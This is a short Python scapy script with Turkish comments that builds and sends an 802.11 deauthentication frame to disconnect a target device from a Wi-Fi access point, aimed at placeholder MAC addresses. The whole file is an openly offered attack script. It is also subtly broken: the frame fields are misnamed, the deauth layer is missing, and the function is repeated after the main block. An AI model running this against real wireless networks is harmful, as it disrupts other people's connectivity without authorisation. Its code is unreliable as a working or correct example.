import scapy.all as scapy

def deauth_attack(target_mac, ap_mac):
    # Deauthentication paketini oluştur
    deauth_packet = scapy.Dot11(type=0, subtype=12, dest=target_mac, src=ap_mac)

    # Paketi gönder
    scapy.sendp(deauth_packet)

if __name__ == "__main__":
    # Hedef cihazın MAC adresini gir
    target_mac = "AA:BB:CC:DD:EE:FF"

    # Erişim noktasının MAC adresini gir
    ap_mac = "BB:CC:DD:EE:FF:AA"

    # Deauthentication saldırısını başlat
    deauth_attack(target_mac, ap_mac)


def deauth_attack(target_mac, ap_mac):
    # Deauthentication paketini oluştur
    deauth_packet = scapy.Dot11(type=0, subtype=12, dest=target_mac, src=ap_mac)

    # Paketi gönder
    scapy.sendp(deauth_packet)

